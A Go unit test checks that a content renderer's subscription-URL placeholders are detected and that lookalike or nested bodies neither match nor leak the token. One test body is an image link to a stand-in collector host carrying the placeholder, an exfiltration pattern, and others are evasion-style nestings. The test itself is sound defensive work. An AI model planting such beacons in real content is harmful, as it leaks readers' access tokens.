package content

import (
	"encoding/base64"
	"net/url"
	"strings"
	"testing"
)

func TestHasSubscribePlaceholder(t *testing.T) {
	const sub = "https://panel.example.com/api/v1/client/subscribe?token=0123456789abcdef"
	leaks := func(rendered string) bool {
		for _, s := range []string{sub, url.QueryEscape(sub), base64.RawURLEncoding.EncodeToString([]byte(sub)), "0123456789abcdef"} {
			if strings.Contains(rendered, s) {
				return true
			}
		}
		return false
	}

	// Every listed placeholder is one RenderBody expands to the reader's subscription URL.
	if len(SubscribePlaceholders()) != 3 {
		t.Fatalf("placeholders = %v", SubscribePlaceholders())
	}
	for _, p := range SubscribePlaceholders() {
		for _, body := range []string{p, "![](https://collector.example.com/c?u=" + p + ")", "<!--access start-->" + p + "<!--access end-->"} {
			if !HasSubscribePlaceholder(body) {
				t.Errorf("%q not detected", body)
			}
			if !leaks(RenderBody(body, "en", "Example", sub, true)) {
				t.Errorf("%q: RenderBody does not expand it", body)
			}
		}
	}
	// Bodies without a placeholder never render the subscription URL or token, with or without a plan.
	for _, body := range []string{
		"", "{{siteName}}", "{{SubscribeUrl}}", "{{subscribeURL}}", "{{ subscribeUrl }}", "{subscribeUrl}",
		"{{subscribe<!--access start-->x<!--access end-->Url}}", "{{urlEncode{{siteName}}SubscribeUrl}}",
		"{{{{siteName}}subscribeUrl}}", "![](https://img.example.com/a.png?{{siteName}})",
	} {
		if HasSubscribePlaceholder(body) {
			t.Errorf("%q detected", body)
		}
		for _, plan := range []bool{true, false} {
			if got := RenderBody(body, "en", "Example", sub, plan); leaks(got) {
				t.Errorf("%q (plan %v) renders %q", body, plan, got)
			}
		}
	}
	// The list is a copy.
	SubscribePlaceholders()[0] = "x"
	if SubscribePlaceholders()[0] != PlaceholderSubscribeURL {
		t.Fatal("SubscribePlaceholders shares its slice")
	}
}
